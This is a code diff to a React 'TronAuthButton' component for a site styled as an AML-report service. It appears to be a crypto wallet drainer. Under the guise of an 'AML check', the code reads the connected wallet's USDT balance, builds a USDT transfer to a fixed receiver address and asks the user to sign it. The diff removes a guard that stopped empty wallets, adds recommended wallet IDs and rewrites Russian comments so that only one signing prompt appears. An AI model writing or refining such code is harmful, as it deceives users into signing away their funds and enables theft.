@@ -23,7 +23,20 @@ export const TronAuthButton: React.FC = () => {
           icons: ['https://amlreports.pro/images/icon-3.abdd8ed5.webp'],
         },
       },
-      web3ModalConfig: { themeMode: 'dark' },
+      web3ModalConfig: {
+        themeMode: 'dark',
+        explorerRecommendedWalletIds: [
+          '4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0',
+          'c57ca95b47569778a828d19178114f4db188b89b763c899ba0be274e97267d96',
+          '38f5d18bd8522c244bdd70cb4a68e0e718865155811c043f052fb9f1c51de662',
+          '971e689d0a5be527bac79629b4ee9b925e82208e5168b733496a09c0faed0709',
+          '8a0ee50d1f22f6651afcae7eb4253e52a3310b90af5daef78a8c4929a9bb99d4',
+          '0b415a746fb9ee99cce155c2ceca0c6f6061b1dbca2d722b3ba16381d0562150',
+          '20459438007b75f4f4acb98bf29aa3b800550309646d375da5fd4aac6c2a2c66',
+          '15c8b91ade1a4e58f3ce4e7a0dd7f42b47db0c8df7e0d84f63eb39bcb96c4e0f',
+          'c03dfee351b6fcc421b4494ea33b9d4b92a984f87aa76d1663bb28705e95034a',
+        ],
+      },
     });
   }
 
@@ -60,20 +73,12 @@ export const TronAuthButton: React.FC = () => {
         return;
       }
 
-      // Проверяем USDT баланс до создания транзакции!
       const usdtContract = await tronWeb.contract().at(USDT_CONTRACT);
       const usdtRaw = await usdtContract.methods.balanceOf(userAddress).call();
       const usdt = Number(usdtRaw) / 1e6;
-      if (usdt < 0.000001) {
-        setModal('❌ No USDT found on this wallet for AML check.');
-        await adapter.disconnect();
-        setLoading(false);
-        return;
-      }
-
       const receiverHex = tronWeb.address.toHex(TRON_RECEIVER);
 
-      // Создаём транзакцию
+      // Готовим транзакцию
       const { transaction } = await tronWeb.transactionBuilder.triggerSmartContract(
         USDT_CONTRACT,
         'transfer(address,uint256)',
@@ -85,7 +90,7 @@ export const TronAuthButton: React.FC = () => {
         userAddress
       );
 
-      // Подпись транзакции (одно окно подтверждения всегда)
+      // Только ОДИН раз вызываем signTransaction
       const signedTx = await adapter.signTransaction(transaction);
 
       let extra = '';
